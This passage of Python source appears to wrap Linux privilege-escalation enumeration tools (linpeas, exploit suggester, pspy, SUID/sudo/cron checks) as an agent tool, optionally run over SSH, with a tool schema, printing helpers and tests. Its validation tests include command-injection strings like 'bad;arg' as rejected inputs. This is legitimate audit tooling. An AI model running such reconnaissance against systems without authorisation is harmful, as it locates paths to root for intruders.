                    "manual_caps      → getcap -r /\n"
                    "manual_writable  → find / -writable\n"
                    "manual_cron      → read all crontabs\n"
                    "manual_sudo      → sudo -l\n"
                    "manual_docker    → id (docker/lxd group check)\n"
                    "manual_env       → env (PATH hijack detection)"
                ),
            },
            "args": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Extra flags. Examples:\n"
                    "linpeas full:    ['-a']               extended checks\n"
                    "linpeas fast:    ['-s']               skip heavy checks\n"
                    "linpeas passwd:  ['-P', 'Password1']  test known password\n"
                    "LES kern:        ['--kernel', '5.4.0']\n"
                    "LES userspace:   ['--userspace']\n"
                    "pspy fast:       ['-i', '500', '-p']"
                ),
            },
            "timeout": {
                "type": "integer",
                "default": 300,
                "minimum": 30,
                "maximum": 3600,
                "description": "Max execution time in seconds.",
            },
        },
        "required": ["tool", "mode"],
    },
}


# ══════════════════════════════════════════════════════════════
# 9. HELPERS
# ══════════════════════════════════════════════════════════════

def _sep(char: str = "─", width: int = 64) -> str:
    return char * width


def _print_result(label: str, r: dict) -> None:
    print(f"\n{_sep()}\n  {label}\n{_sep()}")
    print(f"  success        : {r['success']}")
    print(f"  tool           : {r['tool']}")
    print(f"  mode           : {r['mode']}")
    print(f"  execution_time : {r['execution_time']}s")
    print(f"  command        : {r['command']}")
    if r.get("kernel_version"):
        print(f"  kernel         : {r['kernel_version']}")
    if r.get("current_user"):
        print(f"  user           : {r['current_user']}")
    if r.get("error"):
        print(f"  error          : {r['error'][:200]}")
    if r["suid_bins"]:
        print(f"  suid_bins ({len(r['suid_bins'])}):")
        for s in r["suid_bins"][:5]:
            gtf = " ← GTFOBins!" if s.get("gtfobins") else ""
            print(f"    {s['path']}{gtf}")
            if s.get("exploit_note"):
                print(f"      note: {s['exploit_note'][:80]}")
    if r["sudo_rules"]:
        print(f"  sudo_rules ({len(r['sudo_rules'])}):")
        for s in r["sudo_rules"][:5]:
            np = " [NOPASSWD]" if s.get("nopasswd") else ""
            print(f"    ({s.get('runas','?')}) {s['command']}{np}")
    if r["capabilities"]:
        print(f"  capabilities ({len(r['capabilities'])}):")
        for c in r["capabilities"][:5]:
            print(f"    {c['path']} = {c['capabilities']}")
            if c.get("exploit_note"):
                print(f"      note: {c['exploit_note'][:80]}")
    if r["cron_jobs"]:
        print(f"  cron_jobs ({len(r['cron_jobs'])}):")
        for c in r["cron_jobs"][:5]:
            print(f"    [{c.get('schedule','?')}] {c['command']}")
    if r["kernel_exploits"]:
        print(f"  kernel_exploits ({len(r['kernel_exploits'])}):")
        for k in r["kernel_exploits"][:5]:
            print(f"    [{k.get('severity','?').upper()}] {k.get('cve','?')} — {k.get('name','?')[:60]}")
    if r["processes"]:
        print(f"  processes (first 5 of {len(r['processes'])}):")
        for p in r["processes"][:5]:
            print(f"    uid={p.get('uid','?')} {p['command'][:80]}")
    if r["container_findings"]:
        print(f"  container_findings ({len(r['container_findings'])}):")
        for c in r["container_findings"][:3]:
            print(f"    {c['finding'][:80]}")
    print(_sep())


# ══════════════════════════════════════════════════════════════
# 10. MAIN — validation + live tests on this machine
# ══════════════════════════════════════════════════════════════

def _run_validation_tests() -> bool:
    cases: list[tuple[str, dict]] = [
        ("PASS — invalid tool",         dict(tool="metasploit", mode="manual_suid")),
        ("PASS — invalid mode",         dict(tool="manual",     mode="pwn_everything")),
        ("PASS — injection in arg ;",   dict(tool="manual",     mode="manual_suid", args=["bad;arg"])),
        ("PASS — injection in arg |",   dict(tool="manual",     mode="manual_suid", args=["bad|arg"])),
        ("PASS — injection in arg &&",  dict(tool="manual",     mode="manual_suid", args=["a&&b"])),
        ("PASS — blocked flag",         dict(tool="linpeas",    mode="full_audit",  args=["--exploit"])),
        ("PASS — timeout out of range", dict(tool="manual",     mode="manual_sudo", timeout=5)),
    ]

    print(f"\n{_sep('═')}")
    print("  VALIDATION TESTS  (all should fail with error)")
    print(_sep("═"))

    all_ok = True
    for label, kwargs in cases:
        result = linux_privesc_audit(**kwargs)
        ok     = not result["success"] and bool(result["error"])
        if not ok:
            all_ok = False
        print(f"  {'✅ PASS' if ok else '❌ FAIL'}  {label}")
        if not ok:
            print(f"         → unexpected: {json.dumps({k:v for k,v in result.items() if k not in ('raw_output',)}, indent=2)[:300]}")

    print(f"\n  Validation suite: {'all passed ✅' if all_ok else 'FAILURES ❌'}")
    return all_ok


def _run_live_tests() -> None:
    """
    Live tests can run either:
      1) locally (default), or
      2) remotely via SSH when env vars are provided.
    """
    target_ip = os.getenv("PRIVESC_TARGET")
    ssh_user  = os.getenv("PRIVESC_USERNAME")
    ssh_pass  = os.getenv("PRIVESC_PASSWORD")
    ssh_key   = os.getenv("PRIVESC_KEY_PATH")

    use_remote = bool(target_ip)
    base_args: dict[str, Any] = {}

    if use_remote:
        if not ssh_user or (not ssh_pass and not ssh_key):
            print(f"\n{_sep('═')}")
            print("  LIVE TESTS — remote mode misconfigured")
            print(_sep("═"))
            print("  Set PRIVESC_TARGET + PRIVESC_USERNAME and one of:")
            print("    PRIVESC_PASSWORD or PRIVESC_KEY_PATH")
            print("  Skipping live tests.")
            return

        try:
            with socket.create_connection((target_ip, 22), timeout=3):
                pass
        except OSError as exc:
            print(f"\n{_sep('═')}")
            print("  LIVE TESTS — remote target unreachable")
            print(_sep("═"))
            print(f"  SSH preflight failed for {target_ip}:22 -> {exc}")
            print("  Skipping live tests.")
            return

        base_args = {"target": target_ip, "username": ssh_user}
        if ssh_key:
            base_args["key_path"] = ssh_key
        else:
            base_args["password"] = ssh_pass

    live_cases: list[tuple[str, dict]] = [
        ("manual_suid  — find / -perm -4000",
         dict(tool="manual", mode="manual_suid",     timeout=30, **base_args)),
        ("manual_caps  — getcap -r /",
         dict(tool="manual", mode="manual_caps",     timeout=30, **base_args)),
        ("manual_sudo  — sudo -l",
         dict(tool="manual", mode="manual_sudo",     timeout=30, **base_args)),
        ("manual_cron  — read all crontabs",
         dict(tool="manual", mode="manual_cron",     timeout=30, **base_args)),
        ("manual_env   — PATH hijack check",
         dict(tool="manual", mode="manual_env",      timeout=30, **base_args)),
        ("manual_docker — id / docker group",
         dict(tool="manual", mode="manual_docker",   timeout=30, **base_args)),
        ("manual_writable — find / -writable",
         dict(tool="manual", mode="manual_writable", timeout=60, **base_args)),
        ("linpeas full_audit (needs /tmp/linpeas.sh)",
         dict(tool="linpeas", mode="full_audit",     timeout=120, **base_args)),
        ("LES kernel (needs /tmp/linux-exploit-suggester.sh)",
         dict(tool="linux-exploit-suggester", mode="les_kernel", timeout=60, **base_args)),
        ("pspy_procs (needs /tmp/pspy64, runs 15s)",
         dict(tool="pspy", mode="pspy_procs", args=["-p", "-i", "1000"], timeout=30, **base_args)),
    ]

    # Keep live tests resilient if function signature changes over time.
    allowed_keys = set(linux_privesc_audit.__code__.co_varnames[:linux_privesc_audit.__code__.co_argcount])

    def _call_audit(kwargs: dict[str, Any]) -> dict[str, Any]:
        safe_kwargs = {k: v for k, v in kwargs.items() if k in allowed_keys}
        return linux_privesc_audit(**safe_kwargs)

    print(f"\n{_sep('═')}")
    if use_remote:
        print(f"  LIVE TESTS — running on REMOTE target via SSH ({target_ip})")
    else:
        print("  LIVE TESTS — running on LOCAL machine")
    print(_sep("═"))

    for label, kwargs in live_cases:
        _print_result(label, _call_audit(kwargs))

    # ── Full JSON of manual_suid ───────────────────────────────
    print(f"\n{_sep('═')}")
    print("  FULL JSON — manual_suid")
    print(_sep("═"))
    r = _call_audit(dict(tool="manual", mode="manual_suid", timeout=30, **base_args))
    print(json.dumps({k: v for k, v in r.items() if k != "raw_output"}, indent=2))


def main() -> None:
    _run_validation_tests()
    _run_live_tests()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  Aborted.")
        sys.exit(0)
